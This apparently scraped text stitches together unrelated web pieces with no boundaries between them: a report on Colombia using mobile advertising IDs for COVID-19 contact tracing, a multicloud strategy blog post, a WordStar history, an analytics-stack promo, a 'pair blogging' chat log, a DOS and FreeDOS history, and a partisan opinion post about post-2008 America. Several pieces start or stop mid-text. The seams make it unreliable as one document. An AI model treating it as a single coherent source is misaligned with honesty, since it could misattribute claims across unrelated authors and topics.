<div><p>Rather than relying on a custom-made app, as many governments around the world have done, Colombia’s tracking systems use the same geolocalized data that allow marketing companies to profile users and show them personalized ads.</p><p>One of the ways that mobile apps make money is by selling information about what people do with their phones, like what websites they visit or where they are at a given moment. That information is tied to a<strong> </strong>numerical code, known as an advertising ID, embedded in Google and Apple’s operating systems.</p></div>



<p>This ID is meant to single out each individual device, creating a profile for advertisers to target ads to specific audiences. All the data obtained is supposedly <a href="https://www.iabuk.com/sites/default/files/publication-download/OnlineBehaviouralAdvertisingHandbook_5455.pdf">anonymous</a>, in the sense that it doesn’t contain any identifiable information, like names or dates of birth. But it can show locations at a given moment in time or websites visited on a smartphone. While users can opt out or reset it on their phone settings, <a href="https://www.adjust.com/glossary/idfa/">only 20% do it</a>.&nbsp;</p>



<p>According to Quiceno, every week, health officials in Antioquia send Servinformación a list of Covid-19 patients and their home addresses. The company first looks for IDs that usually spend the night at these locations. Then, the company searches for IDs found at least 10 meters from the patients’ devices for 30 minutes or more, and also for IDs that might have mingled with them and were at least 10 meters away from them for at least half an hour. Servinformación then blasts both sets of IDs with ads on social media and mobile games, asking the phones’ users to check for any Covid-19 symptoms.</p>



<figure><blockquote><p>Instead of a custom-made app, Bogotá and Antioquia are using mobile ad technology to do contact tracing and monitor how the virus is spreading.</p></blockquote></figure>



<p>There is a second part of this process. The company gathers all the spots where these IDs are spending most of their time and sends these locations to the Antioquia government.<strong> </strong>The officials then look up these properties’ owners in the state registry and send them text messages. “YOU MIGHT HAVE CORONAVIRUS,” the texts say in all caps.</p>



<p>Privacy activists worry that this system could give authorities <a href="https://www.huffingtonpost.co.uk/entry/using-just-1000-worth-of-mobile-adverts-you-can-effectively-track-anyone_uk_59e87ccbe4b0d0e4fe6d6be5?guccounter=1">too much information</a> about people’s daily lives. “It might become a surveillance system, if the government has data from every person who uses a smartphone,” said Andrés Velásquez, a researcher from the Karisma Foundation, the digital rights organization <a href="https://web.karisma.org.co/notificaciones-de-exposicion-a-traves-de-publicidad-wtf/">that first denounced</a> the use of ad tech by health authorities in Bogotá and Antioquia.</p>



<p>The question here is if the government can use these data to track and identify people against their will, particularly in a country where digital intelligence tools have been used to <a href="https://knightcenter.utexas.edu/blog/00-21801-fresh-outrage-colombia-after-semana-publishes-report-alleging-espionage-national-and-i">spy on</a> journalists, activists, and <a href="https://knightcenter.utexas.edu/blog/00-21801-fresh-outrage-colombia-after-semana-publishes-report-alleging-espionage-national-and-i">politicians</a>. “The data is not granular enough to know if two people were close enough for transmitting the virus. But it will expose where people have been and what they were doing,” said Katitza Rodríguez, international rights director of Electronic Frontier Foundation.</p>

<p>“I just have to know where this person lives and see what IDs appear there,” Velasquez said. For example, if John Doe tests positive for Covid-19, health officials will know his address. Once Servinformación checks which IDs are spending the night in that same place, it would be easy for the government to infer which advertising ID belongs to John by seeing his location history.&nbsp;&nbsp;</p>



<p>Quiceno and Isaza say they don’t seek to identify people: The government doesn’t see the actual ID codes, and Servinformación claims it doesn’t have access to any information that could lead to people’s real identities. “The data only shows me the numerical code for the advertising ID and a time stamp,” Isaza said.&nbsp;</p>



<p>They also said that law enforcement has nothing to do with the program, and only the pandemic response team has access to the data. Servinformación is also contractually bound to erase all the information once the program is done, and neither the government nor the company can use the data for any other purpose.</p>



<p>Quiceno also defends mobile ad tracking as a way to do direct testing in high-risk areas. “We tell the cities which specific blocks they should send an epidemiological team to, as there might be a lot of positive cases there,” he told <em>Rest of World</em>. They have sent more than 411,000 ads and text messages since April, triggering more than 1,600 calls to health services — a response rate of 0.4%, below the benchmark of 0.5–0.7% for this kind of digital marketing campaign.</p>



<p>However, Quinceno said the edge Antioquia gains is worth all the hassle. Colombia had almost 600,000 Covid-19 <a href="https://ourworldindata.org/coronavirus/country/colombia?country=~COL#what-is-the-cumulative-number-of-confirmed-cases">confirmed cases</a> as of August 31, and it is <a href="https://ourworldindata.org/coronavirus-data-explorer?tab=table&amp;zoomToSelection=true&amp;country=USA~KOR~DEU~IND~BRA~ITA~IDN~ZAF~MEX~NZL~NOR~COG~COL&amp;casesMetric=true&amp;dailyFreq=true&amp;aligned=true&amp;smoothing=7&amp;pickerMetric=location&amp;pickerSort=asc">one of the countries with the highest rates of new cases</a> in the world, which puts it at a serious risk of overflowing the country’s healthcare capacity. Isaza says his company’s technology can help isolate the so-called Covid-19 “<a href="https://www.scientificamerican.com/article/how-superspreading-events-drive-most-covid-19-spread1/">superspreaders.</a>” “Just by locking down the blocks where these spreaders live,” he said, “the benefits would be huge.”</p>



<p>Colombians seem to acknowledge that. Once Moreno clicked the ad, she was redirected to a form that asked for private information, like her health antecedents&nbsp;and if she was experiencing Covid-19 symptoms. She filled it out, even though she felt like it was a bit too much. “I wanted to let them know I was here,” she said.</p>



<p>All that happened was the arrival of an SMS later that evening, at midnight: “We will call you if necessary.” No one did, but the ads kept showing up in her social feeds through the rest of the month, as a reminder that even in isolation, she was still surrounded by the virus.</p>

<p><em>Pondering the care and feeding of your multicloud <a href="https://en.wikipedia.org/wiki/Gelatinous_cube">gelatinous cube</a>. (Which engulfs everything in its path, and digests everything organic.)</em></p>



<p>Most organizations&nbsp;<em>end up</em> multicloud, rather than&nbsp;<em>intending&nbsp;</em>to be multicloud in a deliberate and structured way. So typical tales go like this: The org started doing digital business-related new applications on AWS and now AWS has become the center of gravity for all new cloud-native apps and cloud-related skills. Then the org decided to migrate “boring” LOB Windows-based COTS to the cloud for cost-savings, and lifted-and-shifted them onto Azure (thereby not actually saving money, but that’s a post for another day). Now the org has a data science team that thinks that GCP is unbearably sexy. And there’s a floating island out there of Oracle business applications where OCI is being contemplated. And don’t forget about the division in China, that hosts on Alibaba Cloud…</p>



<p>Multicloud is inevitable in almost all organizations. Cloud IaaS+PaaS spans such a wide swathe of IT functions that it’s impractical and unrealistic to assume that the organization will be single-vendor over the long term. Just like the enterprise tends to have at least three of everything (if not ten of everything), the enterprise is similarly not going to resist the temptation of being multicloud, even if it’s complex and challenging to manage, and significantly increases management costs. It is a rare organization that both has diverse business needs, and can exercise the <em>discipline&nbsp;</em>to use a single provider.</p>



<p>Despite recognizing the giant ooze that we see squelching our way, along with our unavoidable doom, there are things we can do to prepare, govern, and ensure that we retain some of our sanity.</p>



<p>For starters, we can actively choose our multicloud strategy and stance. We can classify providers into tiers, decide what providers are approved for use and under what circumstances, and decide what providers are preferred and/or strategic.</p>



<p>We can then determine the level of support that the organization is going to have for each tier — decide, for instance, that we’ll provide full governance and operations for our primary strategic provider, a lighter-weight approach that leans on an MSP to support our secondary strategic provider, and less support (or no support beyond basic risk management) for other providers.</p>



<p>After that, we can build an explicit workload placement policy that has an algorithm that guides application owners/architects in deciding where particular applications live, based on integration affinities, good technical fit, etc.</p>



<p>Note that&nbsp;<strong>cost-based provider selection and cost-based long-term workload placement are both terrible ideas. </strong>This is a constant fight between cloud architects and procurement managers. It is rooted in the erroneous idea that IaaS is a commodity, and that provider pricing advantages are long-term rather than short-lived. Using cost-based placement often leads to <em>higher&nbsp;</em>long-term TCO, not to mention a grand mess with data gravity and thus data management, and fragile application integrations.</p>



<p>See my new research note, “<a href="https://www.gartner.com/document/3990249">Comparing Cloud Workload Placement Strategies</a>” (Gartner paywall) for a guide to multicloud IaaS / IaaS+PaaS strategies (including when you should pursue a single-cloud approach). In a few weeks, you’ll see the follow-up doc “Designing a Cloud Workload Placement Policy” publish, which provides a guide to writing such policies, with an analysis of different placement factors and their priorities.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
		<h6>* Potted: <em>Adj. Informal</em>. Summarised or abridged: <em>a potted version of a novel...</em></h6>
<h2>In the Beginning...</h2>
<p>It all began at IMS Associates Inc., a company founded by William H Millard. Millard employed Seymour Rubinstein as the director of marketing at IMSAI, and an assembly code programmer, John Robbins Barnaby, as a systems programmer. IMSAI was making a computer based on the 8080 CPU and running Digital Research's CP/M (Control Program/Monitor or Control Program for Microcomputers) operating system. The IMSAI 8080 was a copy of the original 8-bit computer, the MITS Altair. Rob Barnaby worked on enhancements to the CP/M operating system, adding file buffering to allow files that were larger than the computer's memory to be edited, and other useful and much needed functions.</p>
<h3>ED Begot NED</h3>
<p>Barnaby didn't like CP/M's line editor, ED, so he set to writing a replacement for it called NED, New EDitor. Unlike ED, which had been written PL/M (Programming Language for Microprocessors, a sub-set of <a title="PL/I" href="http://en.wikipedia.org/wiki/PL/I" target="_blank">PL/I</a>, Programming Language One), Barnaby used assembler for NED. Once most of ED's functionality had been incorporated, Barnaby added a video mode that allowed 2-dimensional cursor movement. NED retained the command mode of ED for non-editing functions.</p>
<h2>The Early Days and MicroPro</h2>
<h3>WordMaster</h3>
<h4>1976 - 1977</h4>
<p>Rubinstein left IMSAI with $8,500 in cash to form his own company, which he called MicroPro International Inc. Rubinstein obtained a report by DataPro on the current state of word processing computers and the features offered by the software they ran (at this time word processors were based on specialist computer hardware). These systems consisted of names such as Lanier, Vydec, Xerox, IBM, and Wang. Based on this information Rubinstein decided that MicroPro should work on a word processor for the CP/M operating system, which wasn't tied to specific computer hardware.</p>
<p>Rubinstein persuaded Barnaby to join the new MicroPro, and to write the editor and also a sorting program. Within a few months Barnaby had completed writing both programs in assembler. They were released as WordMaster (1976) and SuperSort (1977), both running on the CP/M operating system. WordMaster was basically similar to NED in being a simple text editor with no print formatting capabilities of its own.</p>
<p>WordMaster, plus a formatting program called Tex, formed MicroPro's main sales from September 1978 until April 1979, when WordStar was first shown at the West Coast Computer Faire at Brooks Hall in San Francisco. SuperSort only managed limited sales at the time because "CP/M users weren't ready for data processing" - Seymour Rubinstein, June 2002.</p>
<h3>Millard's IMSAI in Trouble so Starts ComputerLand</h3>
<p>"...IMSAI was in decline by the time MicroPro started shipping products - an informed market had developed, and S-100 users were buying boards made in garages with much lower overhead than IMSAI's. Rather than compete with leaner manufacturing operations, Bill Millard started Computerland, to sell the products of others to business users. IMSAI's products were not kept competitive (and Bill's marketing director and chief programmer were gone) and the company was allowed to go bankrupt. So while WordMaster, SuperSort, and WordStar were developed on IMSAIs (I used mine til I got an IBM PC), few customers used them."</p>
<p>-- Rob Barnaby in email to Mike Petrie 2 May 2000</p>
<h2>WordStar is Born</h2>
<p>Following the completion of WordMaster and SuperSort, Barnaby set to work on Rubinstein's new word processor that was to become WordStar. The now well-known <a title="WordStar commands" href="http://www.wordstar.org/index.php/wsdos-documentation/wsdos-commands/108-wordstar-3-for-dos-commands-reference" target="_blank">WordStar commands</a> first appeared in this new program; <a title="WordMaster's commands" href="http://www.wordstar.org/index.php/12-wordstar-history/171-wordmaster-command-summary" target="_blank">WordMaster's commands</a> were, in the main, <a title="Comparison of WordMaster and WordStar Commands" href="http://www.wordstar.org/index.php/12-wordstar-history/172-comparison-of-wordmaster-and-wordstar-commands" target="_blank">different</a> and split between Command (Control) and Video (Edit) modes. The new program also incorporated a print command and rudimentary text formatting that previously had to be done separately by additional programs.</p>
<p>As Rob Barnaby puts it:</p>
<p>"Seymour was the marketing brains - it was he that said we should address word processing to get a larger market. The defining change was to add margins and word wrap. Additional changes included getting rid of command mode and adding a print function. I was the technical brains - I figured out how to do it, and did it, and documented it. The product's success I think related both to it being the right product (Seymour) and to it being a fairly good implementation given the equipment (me)."</p>
<p>-- Rob Barnaby in email to Mike Petrie 3 May 2000</p>
<h3>WordStar 1.0 for CP/M</h3>
<h4>1978</h4>
<p>Once Barnaby had got the program as far as version 0.89 he was joined by Jim Fox who helped to complete the first version's code and also wrote its installer. WordStar version 1 for CP/M was released in September 1978. Barnaby &amp; Fox continued to work on the code and several interim versions were released culminating in version 2. However, version 2 was copy-protected, which proved to be a public relations disaster and led to its almost immediate replacement.</p>
<p>Once MicroPro completed WordStar it sold the program through Millard's ComputerLand managing a trade of half a Million US dollars trade per month through this outlet alone.</p>
<h3>Barnaby &amp; MicroPro Part Company</h3>
<h4>1979 - 1980</h4>
<p>Barnaby had been working extremely long hours and was burnt out. He stopped direct work on the program, first acting as an advisor and then taking, in October 1979, long overdue holiday. After four months Rubinstein asked Barnaby to return, but he decided that he needed more time. In January 1980 Rubinstein again asked Barnaby to restart coding and promissed back pay and stock options for all the months he'd been away from work. Barnaby still wasn't ready to resume so Rubinstein gave him one more month to decide. This month-by-month extension continued until March at which point Barnaby and MicroPro parted company.</p>
<p>In 1980 Rubinstein brought in a venture capitalist named Fred Adler.</p>
<h3>WordStar for TRS-80 LDOS</h3>
<h4>1979</h4>
<p>Following Barnaby's departure from MicroPro, Fox adapted the code for the new Microsoft CP/M board for the Apple II, and for the Tandy (Radio-Shack) TRS-80's LDOS 5 operating system. WordStar could already be run using CP/M on the TRS-80 and many other CP/M computers of the time. The TRS-80 package included options for mail merge and the earlier WordMaster Editor.</p>
<h3>WordStar for Epson Personal Computer</h3>
<h4>1980</h4>
<p>Epson produced a small computer (PX-8?) that used a built-in LCD display. The company wanted a customised version of WordStar that would be ROM based and would run within 48Kb or RAM. The programmers at MicroPro estimated that they'd need six months to complete the conversion. Rubinstein wasn't impressed and told them that Barnaby had written the entire program in less than that time and that this was only a port to a new platform. Rubinstein called Barnaby to see if he'd be interested in doing the port. Barnaby demanded $100 per hour - he was hired again and completed the job within two weeks! after which he departed again.</p>
<h3>Osborne 1 Portable Computer</h3>
<h4>1981</h4>
<p>In 1981 Adam Osborne introduced his CP/M based portable computer and bundled around $1,500 worth of software with it, including WordStar and the spreadsheet program SuperCalc. The <a href="http://oldcomputers.net/osborne.html" target="_blank">Osborne computer</a> was an immediate success, quickly achieving sales of over 10,000 units per month. This was a great boost to WordStar and helped establish the progam in the market place.</p>
<h3>Other Ports</h3>
<h4>Sep 1981</h4>
<p>In September 1981 the first of several influxes of Irish programmers arrived at MicroPro's San Rafael offices. The first group to arrive were tasked with porting WordStar to other operating systems, including the Apple ][, although they ended up completing an 8086 port from CP/M to CP/M-86 that had been started by Diane Hajicek, who later wrote DataStar, instead.</p>
<h3>WordStar 3.0 for MS-DOS</h3>
<h4>Apr 1982</h4>
<p>In one single all-night session Jim Fox patched the CP/M-86 version of WordStar to make it run under MS-DOS on the IBM PC so that it could be demonstrated to Rubenstein. The actual port was done by a group of Irish programmers using Intel development systems, which ran the ISIS II operating system. The software build was done on 8" floppies and the binary (executable) files were then transferred to the IBM PC by serial cable.</p>
<h4>Oct 1982</h4>
<p>During the early 1980's the company also created and released a spreadsheet called CalcStar and and a database program called DataStar, along with several other supporting programs. WordStar was supported by SpellStar, MailMerge and StarIndex; DataStar by InfoStar, FormGen, ReportStar, FormSort and SuperSort; and CalcStar by PlanStar. The intention was to integrating all of these programs into a single system that was to be called StarBurst - the makings of the first ever 'Office Suite'. Adler killed the project.</p>
<p>By the mid-1980's MS-DOS had gained directories and their attendant paths, but WordStar didn't keep up. This meant that the files being edited still had to be in the same directory as the program. The company had also lost the original documented CP/M code that the DOS version had been ported from. One of the company's programmers, Peter Mierau, regenerated the code base, but only a few months after he completed the task in October 1982, he, and two other programmers, were laid-off. They went and set up a company of their own called <a href="http://www.zdnet.com/computershopper/stories/reviews/0,7171,2403906,00.html" target="_blank">NewStar</a>, with the intention of cloning WordStar from scratch.</p>
<p>At some time during the early 1980's AT&amp;T approached MicroPro asking for WordStar to be ported to UNIX. However, as WordStar was written in assembler, had already been ported from the 8080 to the 8086, and consisted of hundreds of thousands of lines of code it was considered impossible. MicroPro development was, at this time, run by a man called Dan Druid, who had a team of 12 programmers preparing to start work on a new release of WordStar.</p>
<h2>Rise of <em>[a]</em> NewStar</h2>
<h3>NewStar</h3>
<p>Meanwhile, Peter Mierau and the other two laid-off programmers, Stan Reynolds and Richard Post, had made a deal with a Z-80 based computer manufacturer, George Morrow. Morrow gave Mierau and co. capital to set up their company, NewStar. NewStar in return …</p></div></div>

<p>The infrastructure of a modern analytics stack is now the easiest part.</p>



<p>5, 10, or 15 years ago deploying an analytics stack was a huge investment of time and resources. Not anymore.</p>



<p>In this video, we set up a modern analytics from scratch in under an hour. We start from the very beginning. We signup for all the accounts, connect them, load data, transform and combine the data, and create a visualization.</p>



<p>As it should be, the hard part of analytics is now the *what* not the *how*.  The how is so easy we can do it live in under an hour. Check out the video below.</p>



<p>For this particular stack, we are using:</p>



<ul><li><a href="http://snowflake.com/">Snowflake</a> (Warehouse)</li><li><a href="http://fivetran.com/">Fivetran</a> (Extract and load)</li><li><a href="http://getdbt.com/">dbt</a> (data modeling and transfromations)</li><li><a href="http://chartio.com/">Chartio</a> (Data visualization and dashboards)</li></ul>



<p>We’ll load in data from both Postgres and Google Analytics to show how easy it is to combine disparate data sources.</p>

I don’t know<br>
What should we?<br>
Tech?<br>
Culture?<br>

Let’s do it bro</p>
<p><strong>VC:</strong><br>
Sure<br>
UX maybe 😊 inclusive UX?</p>
<p><strong>AD:</strong><br>
That isn’t bad<br>
Something we have strong opinions about<br>
Or maybe contrasting opinions<br>
Hah!</p>
<p><strong>VC:</strong><br>
but I tend to eventually agree with yours though 😊</p>
<p><strong>AD:</strong><br>
Other way round lol!</p>
<p><strong>VC:</strong><br>
Recently, I thought about the conversation we had at the Starbucks at the ground floor of your new office (<strong>AD:</strong>   now old office!)</p>
<p><strong>AD:</strong><br>
Remind me again</p>
<p><strong>VC:</strong><br>
You said something on how good programming practices makes the tools/language used more or less moot…</p>
<p><strong>AD:</strong><br>
Some practices transcend tools I guess</p>
<p><strong>VC:</strong><br>
Well, I had been suffering lately from maybe around 5 years of technical debt in Prudent, stemming from the lack of use of types… (Prudent is VC’s side project)</p>
<p><strong>AD:</strong><br>
That’s sort of true I think still<br>
Haha</p>
<p><strong>VC:</strong><br>
Suffering is not a good word, its an interesting relationship more like</p>

I mean, <em>it works</em></p>
<p><strong>VC:</strong><br>
Hmm…</p>

<p><strong>VC:</strong><br>
I am very tempted to rewrite from scratch again, time and again, and again…</p>
<p><strong>AD:</strong><br>
It’s the best feeling<br>
I kind of wish you had unlimited time<br>
Could just write non stop till it was good enough</p>
<p><strong>VC:</strong><br>
It’s like I am getting nowhere, deja vu in the quantum of years<br>
I am starting again, but this time, I will write it out with pencil first, mathematically…</p>
<p><strong>AD:</strong><br>
I think it’s just you learn to see more and more so it feels like there is more to get right<br>
The higher you are, the less the ground looks like it moves</p>
<p><strong>VC:</strong><br>
Yea, I am pretty sure I learnt, the hard way, but there’s no other way for me to learn, but this time I’d learnt, but it’s too late</p>
<p><strong>VC:</strong><br>
Programming is not something I can be satisfied with in a lifetime</p>
<p><strong>AD:</strong><br>
Yeah</p>
<p><strong>VC:</strong><br>
Need, more, time…</p>
<p><strong>AD:</strong><br>
Me too<br>
My gosh you can’t believe how little time I have now<br>
It’s crushing and depressing<br>

Each post can revolve around a nugget of wisdom</p>
<p><strong>VC:</strong><br>
Hmm…<br>
let me immerse in this and try to get in this zone tonight :)</p>
<p><strong>AD:</strong><br>
😊
I was thinking it’d be cool<br>
Cause I’m going to revive my blog allending.com<br>
I was thinking MCU style<br>
Post 1 on yours<br>
Post 2 on mine<br>
etc<br>
Just seemed like something fun</p>
<p><strong>VC:</strong><br>
Yea, i had a cool idea too while going to sleep yesterday but forgot when i woke up 😅</p>
<p><strong>AD:</strong><br>
What was ittttt?<br>
😃</p>
<p><strong>VC:</strong><br>
Oh yeah<br>
Maybe something like a dialogue</p>
<p><strong>AD:</strong><br>
Oooh<br>
Vito: _____<br>
Allen: _______<br>
Chat revolving around a topic<br>
That’s not bad</p>
<p><strong>VC:</strong><br>
Yea, that is easier as it is less asynchronous</p>
<p><strong>AD:</strong><br>
Not bad<br>
We sort of chat together about something, edit it, and then post</p>
<p><strong>VC:</strong><br>
We can just start with this topic itself… let’s call it pair blogging</p>
<p><strong>AD:</strong><br>
Very meta<br>
and very smart<br>
Calendar slot will force us to do it ? 😊</p>
<p><strong>VC:</strong><br>
I can create a shared private repo on GH<br>
I think we can publish whenever ready<br>
I was thinking of publishing an edited version of this conversation as part of the first post?<br>
The title will be Pair blogging: the epoch<br>
I can send you a draft?</p>
<p><strong>AD:</strong><br>
Oooh good idea<br>
GIT<br>
Let’s</p>
<p>…</p>
<p><strong>And here we are!</strong></p>

<p>In late 1980, someone at IBM had a pretty neat idea. Responding to the popularity of “personal computers” like the Apple II and the TRS-80, IBM decided to get into the game. After a fast-paced development, IBM announced the first IBM Personal Computer 5150 in August 1981. To hit the market quickly, IBM mostly used off-the-shelf parts and licensed or purchased other components from third parties. One of those was the operating system.</p>
<h2>86-DOS to PC-DOS</h2>
<p>Seattle Computer Products had previously developed QDOS, or the “Quick and Dirty Operating System,” but renamed it to “86-DOS” in 1980 when the company wanted to sell the software to others. No one wants to buy a product that’s “Quick and Dirty.”</p>
<p>Soon after, Microsoft purchased 86-DOS and then turned around to license 86-DOS to IBM as PC-DOS, the operating system for the forthcoming IBM Personal Computer.</p>
<p>On the surface, DOS may look like Unix, but actually DOS followed a different path. The 86-DOS was initially designed to be similar to another early personal computer operating system: CP/M by Digital Research. And CP/M itself borrowed ideas from older DEC operating systems. CP/M provided commands, such as <code>DIR</code>&nbsp;to display a list or <em>directory</em> of files, <code>TYPE</code> to display the contents of files, <code>ERA</code> to erase files, and <code>REN</code> to rename files. CP/M also used 8.3 filenames, meaning files could have names of up to eight characters, and an extension of up to three characters.</p>
<p>So it’s not surprising that the first versions of 86-DOS included similar commands like <code>DIR</code>, <code>TYPE</code>, <code>ERASE</code>, and <code>RENAME</code>. In addition, 86-DOS added other commands, such as a simple <code>COPY</code> command, a <code>CHKDSK</code> utility to check for errors on disks, and the <code>EDLIN</code> line-based editor.</p>
<p>After Microsoft updated 86-DOS to become PC-DOS, DOS also included other Microsoft tools, including a version of the BASIC programming language. BASIC was important for the time, because IBM needed to compete against the popular Apple II personal computer, which already featured a BASIC programming environment.</p>
<p>Further, PC-DOS 1.0 also provided&nbsp;<code>COMP</code> to compare two text files, separate&nbsp;<code>DATE</code> and <code>TIME</code>&nbsp;commands to set the system date and time, <code>MODE</code> to configure external devices,&nbsp;<code>DISKCOMP</code> to compare the contents of two floppy disks, and <code>DISKCOPY</code> to copy the contents of one floppy disk to another.</p>
<p>That first version of IBM PC-DOS also supported running “batches” of DOS commands, listed in a file called a&nbsp;<em>batch file</em>. And to support writing batch files, PC-DOS also added a <code>REM</code> command to add comment (“remarks”) to batch files, and a <code>PAUSE</code> command to prompt the user before continuing the batch file.</p>
<p>Microsoft eventually emerged from IBM’s shadow and released MS-DOS on its own. While IBM later released a separate PC-DOS, and other vendors like Digital Research’s DR-DOS tried to enter the market; most DOS versions were really MS-DOS. For the rest of DOS history, when you refer to “DOS,” you probably mean MS-DOS.</p>
<h2>DOS and Killer Apps</h2>
<p>With the birth of DOS came the rise of DOS applications.&nbsp;DOS applications reigned throughout the 1980s and into the 1990s, especially in offices. If you can think of a niche, there was probably a DOS application for it. And never mind that DOS applications primarily ran in text mode, only adding graphics modes after VGA became widespread in the late 1980s. Applications leveraged the text mode presentation of DOS, and users mostly loved it.</p>
<p>Several programs are notable for their popularity at the time. WordStar gained an early lead in word processing, mainly due to its popularity on CP/M, until later being displaced by WordPerfect. Lotus 1-2-3 was the top spreadsheet application and arguably a “killer app” for the PC during the 1980s and into the 1990s.</p>
<p>And there were the games. DOS had a long list of game spanning dozens of genres: Tetris dominated as the classic falling-blocks game. X-COM and Civilization were impressive turn-based strategy games. Warcraft was an immersive real-time strategy game. Star Wars X-Wing (and the follow-up game, Star Wars TIE Fighter) brought the popular flight sim genre into a sci-fi setting. Scorched Earth let you battle friends with tanks. Lemmings was an addictive puzzle game. SimCity let you build cascading cities. Commander Keen let you jump around a two-dimensional world, while Wolfenstein 3D and Doom spawned a hundred other first-person shooter clones.</p>
<p>DOS remained popular because it presented a platform for developers to create new applications and games. And those applications quickly became&nbsp;<em>de facto</em> standards. If you needed to do work from home, you needed to have WordPerfect and Lotus 1-2-3. And that meant you needed to run DOS.</p>
<h2>The DOS Command Line</h2>
<p>But while DOS mostly ran in text mode and included a command line interface, you weren’t really meant to live at the command line. DOS took a different approach than Unix, which featured a rich command line environment with powerful commands, including <code>grep</code>, <code>awk</code>, <code>sed</code>, and <code>nroff</code> to manipulate and process text files. DOS provided a few command line tools to let you modify the system, but otherwise had a limited command line feature set. Rather, DOS expected you to be at the command line just long enough to run the next program or game.</p>
<p>That’s why DOS never really focused the command line on the user. DOS 1 included some 20 commands to do basic system and file maintenance like <code>DATE</code>, <code>TIME</code>, <code>FORMAT</code>, <code>COPY</code>, <code>ERASE</code>/ <code>DEL</code>, and <code>DIR</code>. DOS 2 brought a host of new commands, although several were to support the new concept of “subdirectories,” a necessary addition with the introduction of the 10MB hard drive on the IBM PC-XT and other vendors. For example, DOS 2.0 was the first version of DOS to introduce <code>MD</code> / <code>MKDIR</code>, <code>CD</code> / <code>CHDIR</code>, and <code>RD</code> / <code>RMDIR</code>. This release also provided new commands to process batch files, such as <code>ECHO</code>, <code>IF</code>, <code>GOTO</code>, <code>SET</code>, and <code>FOR</code>.</p>
<p>DOS 4 only added two commands, <code>MEM</code> and <code>TRUENAME</code>. DOS 5 added over a dozen new commands, but again, many of these focused on system maintenance and Windows support. Aside from neat features like the new <code>QBASIC</code> and associated <code>EDIT</code> program, DOS 5 really only brought system-level commands like <code>LH</code> / <code>LOADHIGH</code>, <code>LOADFIX</code>, <code>EMM386</code>, and <code>UNDELETE</code> / <code>UNFORMAT</code>. DOS 6 added less than 10 new commands, mostly to keep your system running well, like <code>DEFRAG</code>, <code>MSCDEX</code>, <code>SCANDISK</code> and <code>SMARTDRV</code>.</p>
<p>Microsoft remained so focused on applications that it eventually replaced MS-DOS with another application-centric operating system. Windows 1 released in late 1985 in response to Apple’s Macintosh, released 1984. Windows 1 generated some interest, but it wasn’t very stable and didn’t have many features. Windows 2 debuted in 1987 with much needed functionality, but it was Windows 3 in 1990 and Windows 3.11 in 1993 that gave rise to Windows as a serious platform. Microsoft effectively “killed” MS-DOS as a platform in 1995, when it released Windows 95, the first version of Windows to not require a separate version of MS-DOS.</p>

<p>In 1994, in the run-up to Windows 95, Microsoft made a lot of noise that the next version of Windows would mean the end of MS-DOS. A physics student named Jim Hall (that’s me) at the University of Wisconsin-River Falls wasn’t much of a fan of Windows, and decided “if Windows 4 is going to be anything like Windows 1, 2, or 3, I’d rather keep using DOS.” And as a programmer of sorts, I started work on a new version of DOS called “PD-DOS,” but we quickly changed to “Free-DOS” and (later) “FreeDOS.”</p>
<p>Since its start in 1994, FreeDOS has continued to support DOS users. FreeDOS is very compatible with MS-DOS, and any application that runs on MS-DOS should also run on FreeDOS. Even Windows runs on FreeDOS, which is quite a feat.</p>
<p>FreeDOS certainly lets you run your favorite DOS applications and games, but FreeDOS also has a larger focus on the command line. FreeDOS includes over 300 command packages divided into a dozen categories, including sound tools, software development, editors, and networking. In addition, FreeDOS also provides many commands borrowed from Unix, like <code>cal</code>, <code>du</code>, <code>tee</code>, and <code>less</code>. There’s even a version of the venerable Unix <code>nroff</code> text processor. So if you’re comfortable at the Linux command line, FreeDOS will feel very familiar.</p>
<p>But the big question is “Why DOS in 2020?” In an era when even the lowest of the low-end PCs come with 200 times as much memory&nbsp;and possibly 50,000 times as much disk space&nbsp;(the original IBM PC came with memory measured in <em>kilobytes</em>), why would you want to run DOS?</p>
<p>These days, most people run FreeDOS to do three things: play classic games, run legacy software, and develop embedded systems. But most of it is games, and that’s okay. DOS had a lot of great games, and they are still tons of fun. And DOS runs great in a PC emulator or virtual machine like VirtualBox or QEMU, making it easy to run FreeDOS alongside your preferred operating system.</p>
<p>You can download FreeDOS for free from&nbsp;<a href="https://www.freedos.org/">freedos.org</a>.</p>

	<div>
		<p>For the past 2 months, I have been seeing many discussions and references to the website “WTF Happened in 1971?” (wtfhappenedin1971.com), which purports to show how society underwent drastic societal and economic change around 1971. </p>
<p>If I was going to make a similar website, I would put the cut-off point as recently as 2008, as when society underwent drastic societal and economic change. I would divide it into the pre-2008 period and the post-2008 period, because that is really when the US began to pull ahead of the rest of the world economically and solidified its dominance, and the fed and other central banks began to implement 0% or lower interest rates, which in the pre-2008 era seemed inconceivable.  Also, 2008 saw the election of Obama, who I think engendered an era of increasing radicalization of the American-left (such as the rise of ‘cancel culture,’ antifa, BLM, the censorship and de-platforming of academics, and loss of creative freedom, whereas in the pre-2008 era its was conservatives who were considered repressive, and it was liberals were defenders of free speech), and the increasing polarization of US politics. </p>
<p>Although, for generations, America has always been divided into a left-right dichotomy, this division seems to have intensified under Obama, who by virtue of his skin color made race a focal issue even if unintentional (but also intentionally, such as Obama invoking the likeness of his hypothetical son to Treyvon Martin, who was killed by ‘white-Hispanic’ George Zimmerman–a case that further exacerbated such division in America, and made worse by Obama taking a side). The Obama presidency had the effect of dividing America, not just in terms of the issues, but along implicit racial lines and identity, as many whites perceived Obama as embodying or conveying anti-white sentiment, and likewise many blacks became increasingly distrustful of Whites. Groups such as the Tea Party, antifa, and BLM rose in the early 2010s, as evidence of increasing division.  Obama’s presidency seemed like a step backwards, in contrast to Clinton, who had the effect of mending race relations, especially after the 1992 Rodney King riots. Now, 18 years later, cities are burning again. Even if there is less crime than ever, as noted by Steven Pinker, it feels like America is on the precipice of blowing up, if it hasn’t already. </p>
